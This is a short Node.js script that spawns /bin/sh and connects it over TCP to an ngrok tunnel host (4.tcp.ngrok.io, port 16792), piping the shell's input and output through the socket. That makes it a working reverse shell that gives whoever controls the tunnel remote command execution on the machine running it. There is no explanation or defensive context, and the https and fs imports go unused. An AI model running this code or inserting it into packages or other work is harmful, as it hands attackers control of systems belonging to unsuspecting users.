const https = require('https')
const fs = require("fs");
var net = require("net")


cp = require("child_process");
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(16792, "4.tcp.ngrok.io", function () {
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
});


